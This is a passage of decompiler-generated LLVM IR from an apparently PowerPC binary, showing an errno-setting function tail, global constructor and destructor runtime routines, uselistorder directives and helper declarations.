  %v0_1000db84 = call i32 @__asm_mfcr()
  %v1_1000db88 = and i32 %v0_1000db84, 268435456
  %v3_1000db88 = icmp eq i32 %v1_1000db88, 0
  store i32 %v0_1000db84, i32* %r31.global-to-local, align 4
  store i32 %v0_1000db84, i32* %r0.global-to-local, align 4
  br i1 %v3_1000db88, label %dec_label_pc_1000dbac, label %dec_label_pc_1000db9c

dec_label_pc_1000db9c:                            ; preds = %entry
  %v0_1000db9c = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000dba4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dba4 = inttoptr i32 %v0_1000db9c to i32*
  store i32 %v0_1000dba4, i32* %v2_1000dba4, align 4
  %v0_1000dbb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000dbb0

dec_label_pc_1000dbac:                            ; preds = %entry
  %v3_1000db94 = icmp eq i32 %v0_1000db84, 0
  br i1 %v3_1000db94, label %dec_label_pc_1000dbbc, label %dec_label_pc_1000dbb0

dec_label_pc_1000dbb0:                            ; preds = %dec_label_pc_1000dbac, %dec_label_pc_1000db9c
  %v0_1000dbb0 = phi i32 [ %v0_1000db84, %dec_label_pc_1000dbac ], [ %v0_1000dbb0.pre, %dec_label_pc_1000db9c ]
  %tmp = icmp slt i32 %v0_1000dbb0, 0
  %v1_1000dbb4 = zext i1 %tmp to i32
  %v2_1000dbb4 = ashr i32 %v0_1000dbb0, 31
  %v3_1000dbb4 = and i32 %v2_1000dbb4, -2
  %v4_1000dbb4 = or i32 %v3_1000dbb4, %v1_1000dbb4
  br label %dec_label_pc_1000dbc4

dec_label_pc_1000dbbc:                            ; preds = %dec_label_pc_1000dbac
  %v3_1000dbbc = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000dbc4

dec_label_pc_1000dbc4:                            ; preds = %dec_label_pc_1000dbb0, %dec_label_pc_1000dbbc
  %v0_1000dbd4 = phi i32 [ %v4_1000dbb4, %dec_label_pc_1000dbb0 ], [ %v3_1000dbbc, %dec_label_pc_1000dbbc ]
  store i32 %v0_1000db58, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000dbd4

; uselistorder directives
  uselistorder i32 %v0_1000dbb0, { 1, 0 }
  uselistorder i32 %v0_1000db84, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 6, 7, 8, 2, 3, 5, 9, 10, 20, 1, 0, 11, 12, 13, 14, 16, 17, 15, 18, 19, 21, 4 }
  uselistorder i32 31, { 7, 8, 9, 1, 2, 10, 11, 12, 13, 14, 3, 4, 0, 6, 5, 15, 16, 17, 35, 36, 33, 34, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 ()* @__errno_location, { 59, 58, 57, 20, 56, 55, 30, 54, 16, 15, 14, 13, 12, 39, 28, 11, 9, 23, 53, 52, 45, 44, 38, 37, 36, 27, 51, 29, 5, 4, 50, 49, 48, 1, 17, 35, 19, 18, 47, 32, 31, 25, 8, 22, 24, 21, 34, 3, 2, 46, 10, 7, 6, 0, 43, 42, 41, 40, 33, 26 }
  uselistorder i32 268435456, { 1, 17, 9, 2, 20, 21, 22, 23, 24, 0, 14, 19, 5, 18, 3, 7, 8, 10, 26, 15, 11, 16, 6, 12, 13, 4, 25, 27, 28, 29 }
  uselistorder i32 ()* @__asm_mfcr, { 33, 12, 32, 20, 31, 9, 8, 7, 6, 5, 34, 15, 30, 29, 28, 10, 25, 11, 27, 23, 21, 19, 3, 14, 18, 13, 24, 17, 16, 26, 4, 2, 1, 0, 22 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000dbc4, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001f9e4.227 to i32), i32* %r31.global-to-local, align 4
  %v3_1000dbf4 = load i32, i32* @global_var_1001f9e4.227, align 4
  %v3_1000dbf8 = icmp eq i32 %v3_1000dbf4, -1
  br i1 %v3_1000dbf8, label %dec_label_pc_1000dc14, label %dec_label_pc_1000dc00

dec_label_pc_1000dc00:                            ; preds = %entry, %dec_label_pc_1000dc00
  %v0_1000dc00 = phi i32 [ %v3_1000dc08, %dec_label_pc_1000dc00 ], [ %v3_1000dbf4, %entry ]
  call void @__pseudo_call(i32 %v0_1000dc00)
  %v0_1000dc08 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000dc08 = add i32 %v0_1000dc08, -4
  %v2_1000dc08 = inttoptr i32 %v1_1000dc08 to i32*
  %v3_1000dc08 = load i32, i32* %v2_1000dc08, align 4
  store i32 %v1_1000dc08, i32* %r31.global-to-local, align 4
  %v3_1000dc0c = icmp eq i32 %v3_1000dc08, -1
  br i1 %v3_1000dc0c, label %dec_label_pc_1000dc14, label %dec_label_pc_1000dc00

dec_label_pc_1000dc14:                            ; preds = %dec_label_pc_1000dc00, %entry
  %v0_1000dc24 = load i32, i32* @r3, align 4
  ret i32 %v0_1000dc24

; uselistorder directives
  uselistorder i32 %v3_1000dc08, { 1, 0 }
  uselistorder i32 -4, { 17, 6, 7, 8, 9, 10, 2, 3, 4, 5, 16, 21, 22, 18, 19, 20, 11, 12, 13, 14, 0, 15, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, { 273, 274, 191, 44, 192, 106, 3, 4, 193, 194, 195, 196, 45, 159, 275, 24, 25, 26, 276, 160, 280, 22, 23, 161, 197, 162, 39, 5, 163, 198, 199, 164, 165, 166, 200, 38, 201, 202, 203, 98, 40, 204, 205, 206, 207, 107, 208, 6, 46, 209, 210, 211, 212, 213, 167, 214, 108, 251, 252, 109, 7, 8, 110, 41, 215, 168, 169, 216, 217, 218, 219, 47, 48, 262, 111, 49, 50, 51, 52, 53, 54, 55, 56, 0, 283, 281, 272, 57, 220, 221, 112, 170, 222, 29, 30, 171, 223, 27, 28, 172, 253, 9, 113, 188, 10, 58, 42, 255, 31, 32, 173, 114, 92, 256, 59, 189, 263, 264, 37, 190, 279, 224, 60, 225, 174, 226, 33, 34, 227, 228, 261, 43, 61, 254, 284, 285, 229, 259, 62, 175, 176, 230, 231, 177, 232, 95, 178, 179, 180, 181, 182, 35, 183, 115, 63, 64, 233, 234, 235, 14, 15, 16, 17, 18, 19, 20, 93, 94, 236, 13, 237, 11, 238, 239, 184, 116, 21, 185, 240, 241, 1, 243, 244, 2, 117, 118, 186, 36, 119, 99, 245, 120, 242, 246, 66, 65, 247, 248, 249, 67, 68, 69, 277, 278, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 282, 84, 286, 121, 100, 157, 250, 122, 123, 124, 91, 90, 89, 88, 87, 86, 85, 125, 126, 127, 128, 129, 130, 131, 132, 133, 135, 134, 136, 137, 138, 139, 257, 140, 141, 142, 12, 143, 144, 258, 158, 187, 145, 146, 96, 147, 148, 260, 149, 97, 150, 101, 102, 103, 104, 105, 151, 152, 265, 266, 267, 153, 268, 269, 270, 271, 154, 155, 156 }
  uselistorder i32 1, { 206, 397, 121, 122, 660, 661, 662, 295, 663, 120, 65, 296, 553, 51, 48, 49, 47, 50, 554, 399, 398, 32, 31, 33, 242, 751, 339, 340, 401, 400, 95, 91, 94, 93, 90, 92, 404, 403, 402, 108, 109, 0, 715, 716, 717, 718, 303, 110, 664, 665, 45, 46, 666, 240, 239, 238, 237, 241, 555, 131, 132, 133, 135, 134, 136, 556, 557, 341, 558, 104, 105, 106, 344, 559, 560, 561, 342, 562, 343, 563, 564, 565, 566, 567, 415, 414, 413, 412, 411, 410, 409, 408, 407, 406, 390, 405, 227, 224, 226, 223, 219, 225, 230, 228, 222, 233, 229, 232, 231, 218, 221, 234, 220, 235, 236, 217, 216, 215, 640, 332, 85, 88, 87, 86, 83, 84, 89, 244, 243, 245, 753, 754, 148, 149, 147, 568, 569, 416, 247, 246, 251, 249, 250, 248, 304, 570, 419, 418, 417, 187, 101, 100, 99, 252, 253, 178, 130, 115, 345, 420, 111, 346, 322, 321, 305, 551, 166, 571, 424, 423, 422, 421, 127, 126, 123, 124, 128, 125, 129, 755, 427, 426, 425, 116, 119, 118, 117, 756, 428, 641, 642, 643, 333, 644, 77, 79, 81, 76, 78, 75, 80, 82, 347, 645, 552, 73, 69, 67, 71, 68, 72, 70, 74, 670, 306, 671, 429, 257, 256, 254, 258, 259, 260, 255, 6, 5, 7, 4, 183, 179, 182, 181, 184, 186, 180, 185, 430, 431, 432, 213, 434, 433, 10, 8, 9, 35, 36, 34, 177, 292, 730, 435, 97, 98, 96, 752, 261, 348, 349, 438, 437, 436, 204, 201, 202, 203, 200, 205, 102, 323, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 646, 647, 113, 112, 757, 450, 449, 262, 452, 451, 199, 198, 197, 453, 572, 573, 454, 263, 265, 264, 266, 698, 699, 700, 701, 702, 703, 704, 705, 706, 708, 707, 709, 710, 38, 37, 44, 42, 41, 43, 40, 39, 297, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 207, 208, 211, 209, 210, 212, 742, 743, 744, 711, 286, 30, 29, 28, 668, 667, 298, 712, 103, 765, 766, 191, 188, 192, 189, 190, 761, 762, 763, 764, 270, 269, 268, 267, 66, 350, 584, 585, 586, 391, 12, 11, 13, 587, 588, 352, 589, 590, 591, 592, 593, 594, 596, 597, 598, 353, 599, 600, 307, 601, 351, 602, 354, 603, 604, 605, 595, 458, 457, 456, 455, 25, 22, 20, 24, 18, 15, 16, 17, 23, 14, 19, 27, 26, 21, 606, 607, 608, 609, 610, 273, 274, 275, 271, 272, 276, 277, 355, 157, 155, 154, 156, 611, 612, 145, 144, 146, 143, 614, 308, 615, 293, 309, 617, 618, 619, 620, 310, 622, 312, 621, 616, 466, 465, 464, 463, 462, 461, 460, 459, 54, 55, 58, 60, 56, 53, 52, 59, 57, 64, 61, 62, 63, 299, 300, 161, 162, 163, 613, 324, 392, 467, 356, 169, 168, 167, 759, 325, 760, 623, 468, 158, 159, 160, 174, 164, 171, 278, 165, 138, 137, 469, 173, 139, 193, 279, 470, 280, 172, 175, 140, 196, 471, 195, 472, 194, 758, 473, 141, 624, 311, 315, 294, 625, 626, 627, 282, 359, 628, 629, 630, 313, 631, 360, 632, 633, 634, 357, 358, 319, 361, 635, 283, 314, 478, 477, 476, 475, 474, 636, 637, 483, 482, 481, 393, 480, 479, 362, 638, 639, 484, 648, 649, 363, 364, 485, 650, 651, 366, 652, 287, 326, 653, 654, 365, 655, 367, 494, 493, 492, 491, 490, 489, 488, 487, 486, 656, 327, 657, 658, 368, 659, 288, 369, 503, 502, 501, 500, 499, 498, 497, 496, 495, 669, 370, 508, 507, 506, 505, 504, 672, 371, 673, 674, 513, 512, 511, 510, 509, 675, 372, 676, 516, 515, 514, 170, 334, 677, 518, 517, 152, 151, 150, 316, 285, 678, 317, 519, 328, 679, 373, 374, 681, 289, 680, 375, 522, 521, 520, 142, 284, 682, 683, 376, 377, 378, 684, 394, 685, 686, 329, 330, 379, 687, 380, 688, 290, 529, 528, 527, 526, 525, 524, 523, 689, 690, 691, 381, 692, 693, 291, 694, 382, 695, 532, 531, 530, 395, 696, 176, 697, 533, 383, 713, 535, 534, 714, 107, 336, 719, 720, 335, 721, 722, 337, 338, 723, 724, 725, 1, 2, 727, 726, 384, 385, 538, 537, 536, 386, 728, 729, 539, 541, 540, 543, 542, 387, 544, 731, 732, 331, 739, 740, 318, 741, 545, 320, 3, 547, 546, 302, 733, 734, 301, 737, 738, 388, 389, 735, 736, 548, 114, 745, 746, 153, 747, 748, 749, 281, 750, 550, 549, 214, 396 }
  uselistorder label %dec_label_pc_1000dc00, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1000dc40 = load i32, i32* @r3, align 4
  ret i32 %v0_1000dc40

; uselistorder directives
  uselistorder i32* @r3, { 15, 16, 9, 109, 110, 10, 45, 46, 152, 160, 157, 158, 111, 112, 11, 113, 114, 115, 17, 47, 48, 49, 50, 51, 12, 52, 53, 54, 55, 56, 1, 0, 57, 58, 59, 18, 161, 37, 171, 2, 19, 3, 32, 60, 61, 36, 165, 166, 167, 120, 121, 122, 123, 124, 125, 126, 127, 40, 41, 42, 43, 44, 137, 138, 159, 62, 20, 21, 22, 23, 168, 169, 63, 64, 65, 66, 155, 142, 143, 13, 24, 170, 67, 25, 68, 69, 26, 70, 71, 72, 4, 8, 5, 73, 6, 74, 7, 75, 76, 77, 78, 79, 80, 27, 81, 82, 83, 84, 85, 39, 86, 87, 88, 162, 163, 164, 89, 90, 28, 91, 92, 93, 95, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 116, 117, 118, 119, 128, 129, 130, 131, 132, 133, 38, 134, 135, 136, 139, 14, 140, 141, 144, 145, 146, 148, 147, 149, 150, 151, 33, 34, 153, 154, 156, 29, 30, 31, 35 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268491860, i32* @lr, align 4
  %v0_1000dc50 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1000dc50

; uselistorder directives
  uselistorder i32 0, { 22, 454, 455, 83, 33, 744, 151, 456, 457, 458, 23, 459, 105, 104, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 24, 870, 260, 873, 57, 261, 196, 874, 262, 877, 878, 55, 56, 879, 871, 872, 0, 799, 800, 801, 107, 106, 802, 1, 108, 197, 745, 746, 747, 2, 472, 473, 153, 475, 474, 52, 3, 476, 152, 4, 477, 155, 478, 53, 5, 479, 154, 480, 481, 482, 483, 484, 263, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 109, 110, 498, 499, 500, 501, 502, 503, 504, 505, 506, 34, 507, 264, 79, 508, 509, 510, 511, 512, 111, 513, 514, 515, 516, 517, 518, 519, 520, 690, 691, 112, 692, 693, 694, 250, 251, 695, 696, 697, 25, 6, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 84, 880, 881, 882, 885, 883, 7, 156, 541, 540, 157, 539, 85, 542, 543, 544, 113, 545, 810, 824, 825, 198, 826, 546, 886, 443, 887, 888, 889, 890, 444, 827, 265, 906, 907, 266, 912, 932, 158, 933, 267, 924, 8, 891, 892, 114, 547, 548, 268, 199, 269, 549, 550, 60, 61, 551, 552, 553, 270, 554, 555, 556, 58, 59, 557, 558, 893, 894, 895, 896, 897, 898, 115, 905, 698, 699, 700, 701, 702, 116, 703, 704, 705, 252, 706, 271, 707, 272, 445, 446, 447, 117, 448, 118, 761, 762, 159, 86, 103, 763, 764, 9, 774, 449, 450, 119, 451, 452, 453, 830, 832, 35, 833, 62, 834, 831, 828, 829, 10, 837, 835, 836, 160, 838, 839, 120, 840, 841, 273, 842, 121, 843, 844, 845, 846, 847, 848, 849, 11, 12, 435, 559, 560, 561, 63, 64, 562, 13, 274, 803, 708, 200, 275, 913, 914, 915, 916, 917, 918, 919, 920, 276, 921, 14, 122, 563, 564, 26, 27, 201, 28, 565, 161, 15, 793, 794, 795, 65, 566, 567, 162, 277, 568, 569, 570, 571, 572, 573, 862, 863, 163, 748, 16, 78, 796, 164, 934, 935, 936, 937, 938, 939, 940, 941, 925, 926, 927, 66, 928, 929, 930, 931, 123, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 87, 588, 589, 590, 591, 592, 190, 593, 594, 595, 124, 596, 597, 598, 599, 600, 125, 601, 602, 603, 604, 605, 606, 607, 126, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 36, 145, 146, 165, 619, 620, 127, 621, 278, 622, 623, 279, 626, 132, 128, 624, 625, 281, 627, 628, 629, 631, 133, 632, 17, 18, 134, 135, 129, 130, 633, 634, 131, 635, 636, 637, 638, 639, 640, 641, 642, 643, 280, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 436, 654, 655, 29, 657, 67, 88, 136, 282, 660, 253, 661, 656, 658, 659, 662, 663, 137, 439, 440, 80, 54, 74, 630, 166, 664, 665, 666, 667, 900, 902, 901, 168, 138, 904, 903, 167, 202, 668, 669, 864, 884, 283, 765, 875, 876, 670, 788, 808, 814, 908, 139, 909, 868, 815, 869, 816, 783, 817, 818, 671, 899, 910, 911, 922, 923, 37, 38, 193, 286, 287, 169, 672, 290, 31, 32, 291, 673, 674, 297, 298, 373, 374, 292, 675, 676, 677, 293, 678, 679, 680, 30, 39, 191, 285, 437, 288, 192, 289, 299, 300, 681, 682, 294, 683, 301, 302, 284, 295, 296, 203, 170, 685, 303, 684, 306, 307, 304, 305, 686, 308, 687, 309, 688, 310, 689, 311, 143, 142, 141, 140, 709, 194, 316, 204, 710, 711, 324, 712, 714, 315, 325, 713, 174, 715, 323, 716, 717, 718, 321, 719, 721, 314, 322, 720, 173, 722, 723, 724, 319, 725, 727, 313, 320, 726, 172, 728, 729, 730, 317, 731, 733, 312, 318, 732, 171, 734, 735, 736, 737, 738, 331, 739, 208, 207, 329, 328, 68, 740, 206, 205, 327, 326, 176, 330, 40, 147, 175, 332, 333, 334, 741, 338, 742, 210, 209, 336, 335, 69, 337, 41, 148, 177, 339, 340, 341, 743, 89, 90, 343, 213, 214, 211, 344, 754, 342, 749, 750, 751, 752, 753, 178, 755, 756, 345, 254, 757, 212, 758, 759, 760, 91, 92, 93, 94, 348, 219, 218, 215, 349, 77, 255, 766, 350, 347, 217, 767, 351, 216, 42, 95, 352, 346, 768, 769, 770, 771, 354, 355, 356, 357, 358, 359, 360, 361, 362, 43, 353, 179, 149, 363, 256, 772, 195, 773, 70, 75, 76, 82, 81, 44, 45, 220, 221, 222, 144, 364, 223, 224, 225, 226, 782, 776, 778, 779, 780, 366, 781, 367, 228, 227, 365, 71, 775, 777, 21, 46, 96, 181, 180, 19, 20, 438, 368, 784, 229, 230, 231, 232, 785, 786, 233, 234, 369, 72, 787, 789, 188, 372, 790, 237, 371, 73, 791, 235, 370, 182, 236, 47, 150, 792, 238, 375, 376, 377, 798, 378, 797, 380, 381, 379, 804, 805, 257, 806, 807, 97, 48, 258, 809, 183, 811, 382, 383, 384, 239, 812, 813, 240, 385, 819, 820, 386, 821, 822, 823, 387, 98, 243, 241, 242, 388, 389, 861, 99, 49, 189, 184, 246, 247, 850, 851, 852, 853, 185, 244, 245, 248, 854, 855, 856, 187, 50, 100, 101, 186, 858, 859, 860, 259, 102, 51, 857, 865, 866, 249, 942, 943, 944, 867, 441, 442, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959 }
  uselistorder i32* @lr, { 9, 16, 412, 413, 414, 256, 17, 18, 19, 20, 21, 22, 388, 419, 420, 421, 422, 415, 416, 417, 418, 351, 257, 258, 259, 260, 23, 24, 25, 423, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 424, 425, 40, 41, 389, 390, 10, 434, 435, 439, 440, 441, 442, 443, 456, 458, 460, 436, 438, 42, 43, 44, 45, 46, 47, 48, 426, 432, 433, 11, 12, 271, 14, 272, 13, 15, 391, 393, 392, 394, 395, 396, 397, 398, 399, 49, 362, 273, 274, 275, 400, 326, 317, 138, 318, 352, 157, 444, 445, 446, 447, 448, 451, 452, 453, 50, 51, 52, 337, 338, 339, 340, 53, 54, 55, 341, 459, 457, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 7, 8, 77, 91, 92, 427, 428, 429, 430, 431, 454, 455, 93, 94, 354, 371, 437, 372, 449, 450, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 233, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 0, 234, 235, 236, 237, 238, 250, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 1, 251, 252, 253, 254, 255, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 2, 3, 4, 5, 6, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 319, 320, 321, 322, 323, 324, 325, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 342, 343, 344, 345, 346, 347, 348, 349, 350, 353, 355, 356, 357, 358, 359, 360, 361, 363, 364, 365, 366, 367, 368, 369, 370, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 401, 402, 403, 404, 405, 406, 408, 407, 409, 410, 411 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
